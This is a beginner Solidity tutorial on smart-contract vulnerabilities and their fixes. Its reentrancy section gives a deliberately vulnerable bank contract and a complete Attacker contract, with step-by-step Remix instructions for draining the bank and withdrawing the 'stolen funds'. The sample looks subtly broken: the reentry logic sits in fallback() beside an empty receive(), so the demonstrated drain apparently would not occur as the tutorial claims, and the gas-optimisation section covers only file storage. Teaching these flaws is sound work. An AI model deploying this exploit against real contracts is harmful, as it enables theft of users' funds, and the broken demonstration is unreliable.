# Writing Secure and Gas-Efficient Smart Contracts with Solidity  

This guide is for developers, especially beginners, who want to build **secure** and **gas-efficient** smart contracts using Solidity. We’ll use clear explanations, real-world analogies, and hands-on examples. If you're new to smart contracts, don’t worry—we’ll break everything down step by step.  

You can test each example yourself using **Remix IDE**, a great tool for learning Solidity.  

---  

## Table of Contents  
1. [Introduction](#introduction)  
2. [Understanding Reentrancy](#understanding-reentrancy)  
3. [Fallback Function](#fallback-function)  
4. [Other Common Vulnerabilities](#other-common-vulnerabilities)  
   - [Integer Overflow/Underflow](#integer-overflowunderflow)  
   - [Timestamp Dependence](#timestamp-dependence)  
   - [Denial of Service (DoS)](#denial-of-service-dos)  
   - [tx.origin Authentication](#txorigin-authentication)  
   - [Insecure Randomness](#insecure-randomness)  
5. [Gas Optimization Techniques](#gas-optimization-techniques)  
6. [Testing in Remix](#testing-in-remix)  
7. [Summary](#summary)  

---  

## Introduction  
Smart contracts on Ethereum (and other EVM-compatible blockchains) must be:  

- **Secure** – Can an attacker steal funds or break the contract?  
- **Gas-Efficient** – Can we reduce transaction costs?  

Every computation on Ethereum costs **gas**, so inefficient code wastes money. This guide covers common security risks, how attackers exploit them, and how to write better code.  

---  

## Understanding Reentrancy  

### What is Reentrancy?  
Reentrancy happens when a contract sends Ether **before** updating its internal state. If the receiving address is a malicious contract, it can call back into the original function repeatedly, draining funds.  

### Real-World Analogy  
Imagine a bank where:  
1. You request a withdrawal.  
2. The teller hands you cash but forgets to mark your account as debited.  
3. You immediately request another withdrawal before they update your balance.  
4. You keep doing this until the bank runs out of money.  

This is exactly how a reentrancy attack works.  

---

## ✅ Step-by-Step Guide to Test the VulnerableBank and Attacker Contract in Remix

### 🔨 Step 1: Write the `VulnerableBank` contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "No funds");

        // ❌ vulnerable: Ether sent before state update
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

---

### 🧱 Step 2: Deploy the `VulnerableBank` contract

- In Remix, compile and deploy it first.
- Copy the deployed address — you’ll need this in the next step.

---

### 🔨 Step 3: Write the `Attacker` contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public bank;
    address public owner;
    uint public attackCount;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether && attackCount < 5) {
            attackCount++;
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        bank.deposit{value: 1 ether}();  // Step 1: deposit
        bank.withdraw();                // Step 2: start reentrant attack
    }

    function withdrawFunds() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {}
}
```

---

### 🧪 Step 4: Setup and Run the Test

#### A. Fund the bank

Before launching the attack, you need to **fund the bank** contract with some Ether so the attack has something to drain.

1. In Remix:
   - Choose the **VulnerableBank contract**
   - Use the **`deposit()`** function
   - In the value field (top-left corner), enter something like `5 ether`
   - Click `deposit()`

Repeat this using **other test accounts** to simulate multiple users funding the bank.

#### B. Deploy Attacker

- Paste the VulnerableBank’s address into the Attacker contract constructor
- Deploy the Attacker contract

#### C. Launch the Attack

1. Change the selected account in Remix to the **Attacker’s owner account**
2. Enter `1 ether` in the value box
3. Call `attack()` on the Attacker contract

✅ You’ll see that the attacker withdraws multiple times before their balance is updated, draining the contract.

---

### ✅ Step 5: Confirm Exploit Worked

- Use `getBalance()` on both contracts:
  - The **VulnerableBank** should now be **drained or nearly empty**
  - The **Attacker contract** should hold **multiple ETH**
- You can call `withdrawFunds()` to send all stolen funds to the attacker’s owner wallet

---

### How to Fix It: Checks-Effects-Interactions  
Always **update state before** making external calls.  

```solidity  
function withdraw() public {  
    uint amount = balances[msg.sender];  
    require(amount > 0);  

    balances[msg.sender] = 0; // State updated first  
    (bool sent, ) = msg.sender.call{value: amount}("");  
    require(sent);  
}  
```  

---  

## Fallback Function  
The `fallback()` function runs when:  
- Ether is sent with **no function call**  
- A **non-existent function** is called  

```solidity  
fallback() external payable {  
    // Executes when no matching function is found  
}  
```  

**Example Use Case:**  
```solidity  
contract SimpleWallet {  
    address owner;  

    constructor() {  
        owner = msg.sender;  
    }  

    fallback() external payable {  
        require(msg.sender == owner, "Not owner!");  
    }  

    function withdraw() public {  
        require(msg.sender == owner);  
        payable(owner).transfer(address(this).balance);  
    }  
}  
```  
Here, only the owner can send Ether directly to the contract.  

---  

## Other Common Vulnerabilities  

### 1. Integer Overflow/Underflow  
Before Solidity 0.8.0, numbers could wrap around silently.  

**Example:**  
```solidity  
uint8 public balance = 255;  
balance += 1; // Becomes 0 (overflow)  
```  

**Fix:**  
- Use Solidity ≥ 0.8.0 (automatically reverts on overflow).  
- Or use `SafeMath` library (for older versions).  

---  

### 2. Timestamp Dependence  
Miners can slightly manipulate `block.timestamp`.  

**Bad Example:**  
```solidity  
if (block.timestamp % 7 == 0) {  
    // "Random" winner chosen  
}  
```  

**Fix:**  
- Avoid using timestamps for randomness.  
- Use Chainlink VRF for true randomness.  

---  

### 3. Denial of Service (DoS)  
If one transaction fails, it can block others.  

**Bad Example:**  
```solidity  
function refundAll() public {  
    for (uint i = 0; i < users.length; i++) {  
        payable(users[i]).transfer(balances[users[i]]);  
    }  
}  
```  
**Problem:** If one transfer fails (e.g., gas limit), the whole function reverts.  

**Fix: Use Pull Payments**  
```solidity  
function claimRefund() public {  
    uint amount = balances[msg.sender];  
    balances[msg.sender] = 0;  
    payable(msg.sender).transfer(amount);  
}  
```  

---  

### 4. tx.origin Authentication  
`tx.origin` gives the original sender, not the immediate caller.  

**Bad Example:**  
```solidity  
require(tx.origin == owner, "Not owner!");  
```  

**Attack Scenario:**  
1. User calls `MaliciousContract`.  
2. `MaliciousContract` calls `YourContract`.  
3. `tx.origin` is the user, so the check passes!  

**Fix:** Always use `msg.sender`.  

---  

### 5. Insecure Randomness  
`block.timestamp` and `blockhash` can be manipulated.  

**Bad Example:**  
```solidity  
uint random = uint(keccak256(abi.encodePacked(block.timestamp)));  
```  

**Fix:** Use **Chainlink VRF** for secure randomness.  

---  

## Gas Optimization Techniques  

## Storing Large Files Like PDFs, Images, and Videos

Blockchains are not ideal for storing large data files like PDFs, videos, or images because:

1. **Storage on-chain is extremely expensive** — each byte stored costs gas.
2. **All nodes on the network replicate the storage** — increasing network size and reducing scalability.

### ❌ What NOT to do:
Avoid writing code like this:
```solidity
// DO NOT DO THIS
bytes public pdfData;

function upload(bytes memory data) public {
    pdfData = data; // Very expensive!
}
```
Even uploading a 1MB file could cost hundreds of dollars in gas.

### ✅ Best Practice: Use Off-Chain Storage + On-Chain Reference
Use decentralized storage systems like:
- **IPFS (InterPlanetary File System)**
- **Filecoin**
- **Arweave**

### 🔗 Example Flow:
1. Upload the file (PDF, image, etc.) to IPFS.
2. Get the **CID (Content Identifier)**.
3. Store that CID or URL in your smart contract.

```solidity
contract DocumentStorage {
    mapping(uint => string) public fileCIDs;
    uint public fileCount;

    function storeFileCID(string calldata cid) external {
        fileCount++;
        fileCIDs[fileCount] = cid; // cost-efficient string reference
    }
}
```

### 🌐 Example CID from IPFS:
```
QmXYZ123...abc
```
This is enough for your frontend or backend to fetch the actual file.

### 🛠 Tools You Can Use:
- **nft.storage** (for NFT metadata and files)
- **web3.storage** (uses IPFS under the hood)
- **Pinata**, **Infura IPFS** — for easy IPFS hosting with APIs

### ✅ Why This Works:
- You don’t store large files on-chain
- You keep the blockchain focused on verification and access control
- Users can still retrieve full documents using the content hash (CID)

---

---  

## Testing in Remix  
For **reentrancy testing**:  
1. Deploy `VulnerableBank`.  
2. Deploy `Attacker` with the bank’s address.  
3. Call `attack()` with 1 ETH.  
4. Watch the bank’s balance drain.  

For **integer overflow testing**:  
1. Deploy a contract with an `uint8` variable.  
2. Try incrementing past 255—see if it reverts (Solidity ≥ 0.8.0).  

---  

## Summary  
✅ **Reentrancy:** Update state **before** external calls.  
✅ **Overflows:** Use Solidity ≥ 0.8.0 or `SafeMath`.  
✅ **Timestamps:** Don’t rely on them for randomness.  
✅ **DoS:** Use pull payments instead of loops.  
✅ **Authentication:** Use `msg.sender`, not `tx.origin`.  
✅ **Randomness:** Use Chainlink VRF.  

Test everything in **Remix** to see how attacks work and how fixes prevent them.  

Now you’re ready to write **safer and cheaper** smart contracts! 🚀
